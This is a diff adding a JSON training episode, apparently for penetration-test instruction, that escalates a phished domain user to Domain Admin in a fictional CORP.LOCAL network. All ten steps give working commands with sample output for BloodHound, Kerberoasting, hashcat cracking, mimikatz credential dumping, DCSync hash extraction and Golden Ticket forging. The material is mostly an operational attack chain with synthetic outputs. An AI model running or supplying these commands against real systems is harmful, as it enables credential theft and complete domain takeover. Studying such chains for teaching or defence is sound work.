@@ -1,0 +1,85 @@
+{
+  "title": "Episode 1: From User to Domain Admin via Kerberoasting and DCSync",
+  "scenario": "External penetration test with initial access as standard domain user (john.doe) obtained via phishing. Credentials: john.doe / P@ssw0rd123. No admin rights, standard domain user in CORP.LOCAL domain. Objective: Escalate from domain user to Domain Admin using AD attack techniques including Kerberoasting, credential theft, and lateral movement.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Enumerate Active Directory with BloodHound",
+      "command": "bloodhound-python -d corp.local -u john.doe -p 'P@ssw0rd123' -ns 10.10.10.10 -c All",
+      "output": "INFO: Found AD domain: corp.local\nINFO: Found 124 users\nINFO: Found 87 groups\nINFO: Found 5 computers\nINFO: Done in 00M 52S\n\nJSON files created:\n  20240115_users.json\n  20240115_groups.json\n  20240115_computers.json\n  20240115_domains.json",
+      "explanation": "Collected complete AD data with BloodHound for attack path analysis"
+    },
+    {
+      "step": 2,
+      "description": "Import to BloodHound and analyze attack paths",
+      "command": "[BloodHound GUI]: Mark john.doe as owned, set Domain Admins as target, find shortest path",
+      "output": "Attack path found:\n  john.doe (owned)\n    -> Member of 'IT Admins' group\n    -> IT Admins has GenericAll on 'sqlservice' account\n    -> sqlservice has Kerberoastable SPN\n    -> sqlservice is local admin on DB-01\n    -> admin-desktop logged into DB-01\n    -> admin-desktop is Domain Admin\n\nPath: 6 hops to Domain Admin",
+      "explanation": "BloodHound identified attack path through Kerberoastable service account"
+    },
+    {
+      "step": 3,
+      "description": "Kerberoast service accounts to extract TGS tickets",
+      "command": "impacket-GetUserSPNs corp.local/john.doe:P@ssw0rd123 -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt",
+      "output": "ServicePrincipalName                   Name         \n-------------------------------------  -----------\nMSSQLSvc/DB-01.corp.local:1433         sqlservice\nHTTP/web.corp.local                    svc-web\nexchangeMDB/EXCH-01.corp.local         svc-exchange\nTERMSRV/FILE-01.corp.local             backup_svc\n\nHashes saved to: kerberoast.txt\n4 TGS tickets extracted",
+      "explanation": "Extracted Kerberos TGS tickets for all service accounts with SPNs"
+    },
+    {
+      "step": 4,
+      "description": "Crack Kerberoast hashes offline with hashcat",
+      "command": "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force",
+      "output": "$krb5tgs$23$*sqlservice$CORP.LOCAL$MSSQLSvc/DB-01.corp.local:1433*...:SQLService2023!\n$krb5tgs$23$*svc-web$CORP.LOCAL$HTTP/web.corp.local*...:WebP@ssword\n\nCracked 2/4 hashes:\n  sqlservice: SQLService2023!\n  svc-web: WebP@ssword",
+      "explanation": "Successfully cracked 2 service account passwords offline"
+    },
+    {
+      "step": 5,
+      "description": "Validate sqlservice credentials and check privileges",
+      "command": "crackmapexec smb 10.10.10.0/24 -u sqlservice -p 'SQLService2023!' --shares",
+      "output": "SMB 10.10.10.30 445 DB-01 [+] corp.local\\sqlservice:SQLService2023! (Pwn3d!)\nSMB 10.10.10.30 445 DB-01 [+] Enumerated shares\nShare: ADMIN$ READ,WRITE\nShare: C$ READ,WRITE\n\nsqlservice is local admin on DB-01!",
+      "explanation": "Service account has local admin rights on database server"
+    },
+    {
+      "step": 6,
+      "description": "Access DB-01 with WMIExec and dump credentials",
+      "command": "impacket-wmiexec corp.local/sqlservice:SQLService2023!@10.10.10.30\n\nC:\\> C:\\Tools\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+      "output": "C:\\> whoami\ncorp\\sqlservice\n\nmimikatz # sekurlsa::logonpasswords\n\nUsername: admin-desktop\nDomain: CORP\nPassword: AdminDesk2024!\nNTLM: 64f12cddaa88057e06a81b54e73b949b\n\nDomain Admin credentials harvested!",
+      "explanation": "Dumped memory and found Domain Admin credentials logged into DB-01"
+    },
+    {
+      "step": 7,
+      "description": "Verify Domain Admin access to Domain Controller",
+      "command": "crackmapexec smb 10.10.10.10 -u admin-desktop -p 'AdminDesk2024!' --shares",
+      "output": "SMB 10.10.10.10 445 DC01 [+] corp.local\\admin-desktop:AdminDesk2024! (Pwn3d!)\nShare: ADMIN$ READ,WRITE\nShare: C$ READ,WRITE\nShare: SYSVOL READ\nShare: NETLOGON READ\n\nDomain Admin access confirmed!",
+      "explanation": "Validated Domain Admin credentials work on Domain Controller"
+    },
+    {
+      "step": 8,
+      "description": "Perform DCSync to extract all domain hashes",
+      "command": "impacket-secretsdump corp.local/admin-desktop:AdminDesk2024!@10.10.10.10 -just-dc",
+      "output": "[*] Dumping Domain Credentials\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f86d081884c7d659a2feaa0c55ad015:::\n[... 122 more users ...]\n\nAll domain hashes extracted!\nkrbtgt hash obtained for Golden Tickets",
+      "explanation": "DCSync successful - extracted every domain user hash including krbtgt"
+    },
+    {
+      "step": 9,
+      "description": "Create Golden Ticket for persistent Domain Admin access",
+      "command": "impacket-ticketer -nthash 9f86d081884c7d659a2feaa0c55ad015 -domain-sid S-1-5-21-123456789-123456789-123456789 -domain corp.local Administrator",
+      "output": "[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for corp.local/Administrator\n[*] Signing/Encrypting final ticket\n[*] Saving ticket in Administrator.ccache\n\nGolden Ticket created!\nValid for 10 years",
+      "explanation": "Forged TGT with krbtgt hash for unlimited domain access"
+    },
+    {
+      "step": 10,
+      "description": "Test Golden Ticket access to Domain Controller",
+      "command": "export KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local",
+      "output": "C:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01\n\nC:\\Windows\\system32> net group \"Domain Admins\" /domain\nGroup name     Domain Admins\nMembers\n  Administrator\n  admin-desktop\n\nGolden Ticket working - SYSTEM on DC!",
+      "explanation": "Golden Ticket provides persistent Domain Admin access without password"
+    }
+  ],
+  "outcome": "Successfully escalated from standard domain user to Domain Admin using Kerberoasting attack chain. Extracted service account password, laterally moved to database server, harvested Domain Admin credentials, performed DCSync to dump all domain hashes, and created Golden Ticket for persistent access. Complete domain compromise achieved.",
+  "learning_objectives": [
+    "Use BloodHound for Active Directory attack path analysis",
+    "Perform Kerberoasting to extract and crack service account passwords",
+    "Leverage local admin access for credential harvesting with Mimikatz",
+    "Perform DCSync attack to extract all domain credentials",
+    "Create Golden Tickets with krbtgt hash for persistence",
+    "Chain multiple AD attack techniques for privilege escalation"
+  ]
+}
